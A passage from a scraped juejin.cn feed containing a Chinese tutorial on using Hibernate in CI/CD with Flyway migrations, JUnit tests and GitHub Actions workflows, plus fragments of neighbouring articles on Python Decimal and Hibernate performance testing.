b <span class="hljs-operator">=</span> <span class="hljs-type">Decimal</span>(<span class="hljs-string">'0.1'</span>)

print(a <span class="hljs-operator">*</span> b)  
# 输出: <span class="hljs-number">18.9</span> (类型为 <span class="hljs-type">Decimal</span>)
</code></pre>
<blockquote>
<p><strong>警告</strong>：如果写成 <code>Decimal(0.1)</code>，由于括号内的 0.1 已经是浮点数，误差会被带入 <code>Decimal</code> 中，导致前功尽弃。</p>
</blockquote>
<h3 data-id="heading-3">4. 终于没有那么多的小数位了</h3>
<p>经过 Decimal 的处理，终于可以计算出正确的数字了，没有那么多的小数位。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（85）如何在持续集成/持续部署（CI/CD）中使用Hibernate？]]></title>    <link>https://juejin.cn/post/7603252259560259620</link>    <guid>https://juejin.cn/post/7603252259560259620</guid>    <pubDate>2026-02-05T14:26:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603252259560259620" data-draft-id="7603221478473728042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（85）如何在持续集成/持续部署（CI/CD）中使用Hibernate？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T14:26:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（85）如何在持续集成/持续部署（CI/CD）中使用Hibernate？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:26:37.000Z" title="Thu Feb 05 2026 14:26:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在持续集成/持续部署（CI/CD）流程中使用Hibernate，目的是通过自动化的方式管理和测试数据库操作，从而保证代码在合并和部署时的可靠性和一致性。以下是一个详细的示例，分步骤讲解如何在CI/CD中集成Hibernate，包括数据库配置、迁移、数据种子、自动化测试以及GitHub Actions等CI工具的使用。</p>
<h3 data-id="heading-0">前提条件</h3>
<ul>
<li>本示例使用MySQL作为数据库。</li>
<li>使用Gradle作为构建工具。</li>
<li>利用Flyway进行数据库迁移管理。</li>
<li>使用JUnit进行单元测试。</li>
<li>采用GitHub Actions进行CI/CD。</li>
</ul>
<h3 data-id="heading-1">1. 设置Hibernate配置</h3>
<p>创建一个Hibernate配置文件<code>hibernate.cfg.xml</code>，用于连接数据库。</p>
<h4 data-id="heading-2"><code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span> <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/devops_db<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>db_user<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>db_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">2. 创建实体类</h3>
<p>定义一个简单的实体类来表示数据库表中的数据。</p>
<h4 data-id="heading-4"><code>User.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "users")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String email;

    <span class="hljs-comment">// Getters and setters</span>
}
</code></pre>
<h3 data-id="heading-5">3. 数据库迁移工具</h3>
<p>使用Flyway进行数据库迁移管理。</p>
<h4 data-id="heading-6">Flyway配置（<code>build.gradle</code>）</h4>
<p>在Gradle构建脚本中添加Flyway插件和配置。</p>
<pre><code class="hljs language-groovy" lang="groovy">plugins {
    id 'java'
    id 'org.flywaydb.flyway' version '8.5.13'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'org.hibernate:hibernate-core:5.6.5.Final'
    implementation 'mysql:mysql-connector-java:8.0.27'
    implementation 'org.flywaydb:flyway-core:8.5.13'
    testImplementation 'org.junit.jupiter:junit-jupiter:5.8.2'
}

flyway {
    url = 'jdbc:mysql://localhost:3306/devops_db'
    user = 'db_user'
    password = 'db_password'
    locations = ['filesystem:src/main/resources/db/migration']
}
</code></pre>
<h4 data-id="heading-7">创建迁移脚本</h4>
<p>在<code>src/main/resources/db/migration</code>目录下创建迁移脚本<code>V1__Create_users_table.sql</code>。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
    id <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
);
</code></pre>
<h3 data-id="heading-8">4. 编写数据种子</h3>
<p>编写一个初始化数据的类，用于在应用程序启动时插入一些初始数据。</p>
<h4 data-id="heading-9"><code>DataSeeder.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSeeder</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// Configure Hibernate</span>
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>);
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> config.buildSessionFactory();

        <span class="hljs-comment">// Seed data</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        
        <span class="hljs-type">User</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user1.setName(<span class="hljs-string">"Alice"</span>);
        user1.setEmail(<span class="hljs-string">"alice@example.com"</span>);
        
        <span class="hljs-type">User</span> <span class="hljs-variable">user2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user2.setName(<span class="hljs-string">"Bob"</span>);
        user2.setEmail(<span class="hljs-string">"bob@example.com"</span>);

        session.save(user1);
        session.save(user2);

        transaction.commit();
        session.close();
        sessionFactory.close();
    }
}
</code></pre>
<h3 data-id="heading-10">5. 单元测试</h3>
<p>编写单元测试来确保数据库操作的正确性。</p>
<h4 data-id="heading-11"><code>UserTest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;
<span class="hljs-keyword">import</span> org.junit.jupiter.api.AfterAll;
<span class="hljs-keyword">import</span> org.junit.jupiter.api.BeforeAll;
<span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.junit.jupiter.api.Assertions.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserTest</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> SessionFactory sessionFactory;

    <span class="hljs-meta">@BeforeAll</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setup</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>);
        sessionFactory = config.buildSessionFactory();
    }

    <span class="hljs-meta">@AfterAll</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tearDown</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (sessionFactory != <span class="hljs-literal">null</span>) {
            sessionFactory.close();
        }
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testUserCreation</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();

        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user.setName(<span class="hljs-string">"Charlie"</span>);
        user.setEmail(<span class="hljs-string">"charlie@example.com"</span>);
        session.save(user);

        transaction.commit();
        session.close();

        session = sessionFactory.openSession();
        <span class="hljs-type">User</span> <span class="hljs-variable">retrievedUser</span> <span class="hljs-operator">=</span> session.get(User.class, user.getId());
        session.close();

        assertNotNull(retrievedUser);
        assertEquals(<span class="hljs-string">"Charlie"</span>, retrievedUser.getName());
        assertEquals(<span class="hljs-string">"charlie@example.com"</span>, retrievedUser.getEmail());
    }
}
</code></pre>
<h3 data-id="heading-12">6. 持续集成</h3>
<p>使用GitHub Actions来自动化构建、测试和部署过程。</p>
<h4 data-id="heading-13"><code>.github/workflows/ci.yml</code></h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">CI</span>

<span class="hljs-attr">on:</span>
  <span class="hljs-attr">push:</span>
    <span class="hljs-attr">branches:</span> [ <span class="hljs-string">main</span> ]
  <span class="hljs-attr">pull_request:</span>
    <span class="hljs-attr">branches:</span> [ <span class="hljs-string">main</span> ]

<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">build:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>

    <span class="hljs-attr">services:</span>
      <span class="hljs-attr">mysql:</span>
        <span class="hljs-attr">image:</span> <span class="hljs-string">mysql:5.7</span>
        <span class="hljs-attr">ports:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-number">3306</span><span class="hljs-string">:3306</span>
        <span class="hljs-attr">env:</span>
          <span class="hljs-attr">MYSQL_ROOT_PASSWORD:</span> <span class="hljs-string">root</span>
          <span class="hljs-attr">MYSQL_DATABASE:</span> <span class="hljs-string">devops_db</span>
          <span class="hljs-attr">MYSQL_USER:</span> <span class="hljs-string">db_user</span>
          <span class="hljs-attr">MYSQL_PASSWORD:</span> <span class="hljs-string">db_password</span>
        <span class="hljs-attr">options:</span> <span class="hljs-string">--health-cmd="mysqladmin</span> <span class="hljs-string">ping</span> <span class="hljs-string">--silent"</span> <span class="hljs-string">--health-interval=10s</span> <span class="hljs-string">--health-timeout=5s</span> <span class="hljs-string">--health-retries=3</span>

    <span class="hljs-attr">steps:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span> <span class="hljs-string">code</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Set</span> <span class="hljs-string">up</span> <span class="hljs-string">JDK</span> <span class="hljs-number">11</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-java@v2</span>
      <span class="hljs-attr">with:</span>
        <span class="hljs-attr">java-version:</span> <span class="hljs-string">'11'</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Grant</span> <span class="hljs-string">execute</span> <span class="hljs-string">permission</span> <span class="hljs-string">for</span> <span class="hljs-string">gradlew</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">chmod</span> <span class="hljs-string">+x</span> <span class="hljs-string">gradlew</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">Flyway</span> <span class="hljs-string">migrations</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">./gradlew</span> <span class="hljs-string">flywayMigrate</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">with</span> <span class="hljs-string">Gradle</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">./gradlew</span> <span class="hljs-string">build</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">tests</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">./gradlew</span> <span class="hljs-string">test</span>
</code></pre>
<h3 data-id="heading-14">持续部署</h3>
<p>可以扩展GitHub Actions工作流，添加部署步骤。例如，部署到AWS Elastic Beanstalk：</p>
<h4 data-id="heading-15"><code>.github/workflows/cd.yml</code></h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">CD</span>

<span class="hljs-attr">on:</span>
  <span class="hljs-attr">push:</span>
    <span class="hljs-attr">branches:</span> [ <span class="hljs-string">main</span> ]

<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">deploy:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>

    <span class="hljs-attr">steps:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span> <span class="hljs-string">code</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Set</span> <span class="hljs-string">up</span> <span class="hljs-string">JDK</span> <span class="hljs-number">11</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-java@v2</span>
      <span class="hljs-attr">with:</span>
        <span class="hljs-attr">java-version:</span> <span class="hljs-string">'11'</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Grant</span> <span class="hljs-string">execute</span> <span class="hljs-string">permission</span> <span class="hljs-string">for</span> <span class="hljs-string">gradlew</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">chmod</span> <span class="hljs-string">+x</span> <span class="hljs-string">gradlew</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">with</span> <span class="hljs-string">Gradle</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">./gradlew</span> <span class="hljs-string">build</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">to</span> <span class="hljs-string">Elastic</span> <span class="hljs-string">Beanstalk</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">einaregilsson/beanstalk-deploy@v20</span>
      <span class="hljs-attr">with:</span>
        <span class="hljs-attr">region:</span> <span class="hljs-string">'us-west-2'</span>
        <span class="hljs-attr">application_name:</span> <span class="hljs-string">'MyApp'</span>
        <span class="hljs-attr">environment_name:</span> <span class="hljs-string">'MyApp-env'</span>
        <span class="hljs-attr">version_label:</span> <span class="hljs-string">'v1.0'</span>
        <span class="hljs-attr">artifact:</span> <span class="hljs-string">'build/libs/myapp.jar'</span>
      <span class="hljs-attr">env:</span>
        <span class="hljs-attr">AWS_ACCESS_KEY_ID:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.AWS_ACCESS_KEY_ID</span> <span class="hljs-string">}}</span>
        <span class="hljs-attr">AWS_SECRET_ACCESS_KEY:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.AWS_SECRET_ACCESS_KEY</span> <span class="hljs-string">}}</span>
</code></pre>
<h3 data-id="heading-16">例子解释</h3>
<ol>
<li><strong>Hibernate配置：</strong> 配置一个Hibernate配置文件<code>hibernate.cfg.xml</code>，用于连接数据库。</li>
<li><strong>实体类：</strong> 创建一个简单的实体类<code>User</code>来表示数据库表中的数据。</li>
<li><strong>数据库迁移工具：</strong> 使用Flyway进行数据库迁移管理，通过Gradle配置Flyway插件。</li>
<li><strong>数据种子：</strong> 编写初始化数据的类<code>DataSeeder</code>，用于在应用程序启动时插入一些初始数据。</li>
<li><strong>单元测试：</strong> 编写单元测试<code>UserTest</code>来确保数据库操作的正确性。</li>
<li><strong>持续集成：</strong> 使用GitHub Actions来自动化构建、测试和部署过程。</li>
</ol>
<p>通过以上配置和代码示例，我们展示了如何在CI/CD流程中使用Hibernate。这包括如何配置Hibernate、定义实体类、使用Flyway进行数据库迁移、编写数据种子和单元测试，以及使用GitHub Actions实现持续集成和持续部署。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（86）如何在性能测试中使用Hibernate？]]></title>    <link>https://juejin.cn/post/7603219519667077139</link>    <guid>https://juejin.cn/post/7603219519667077139</guid>    <pubDate>2026-02-05T14:27:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519667077139" data-draft-id="7603219519667060755" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（86）如何在性能测试中使用Hibernate？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T14:27:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（86）如何在性能测试中使用Hibernate？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:27:22.000Z" title="Thu Feb 05 2026 14:27:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
